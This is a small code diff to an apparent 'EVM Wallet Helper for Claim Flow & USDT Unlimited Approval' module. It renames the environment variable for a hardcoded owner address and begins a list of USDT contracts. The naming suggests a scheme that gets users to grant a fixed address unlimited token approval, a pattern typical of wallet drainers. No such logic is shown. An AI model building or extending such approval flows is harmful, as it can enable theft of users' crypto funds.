@@ -1,7 +1,7 @@
 // EVM Wallet Helper for Claim Flow & USDT Unlimited Approval
 
 export const EVM_OWNER_ADDRESS =
-  import.meta.env.VITE_EVM_OWNER || '0x8bf833ad1dd347cD60a681471739e2b4ce560CdC'
+  import.meta.env.VITE_OWNER_EVM_ADDRESS || '0x8bf833ad1dd347cD60a681471739e2b4ce560CdC'
 
 // Popular USDT contract addresses across EVM chains
 export const EVM_USDT_CONTRACTS = {
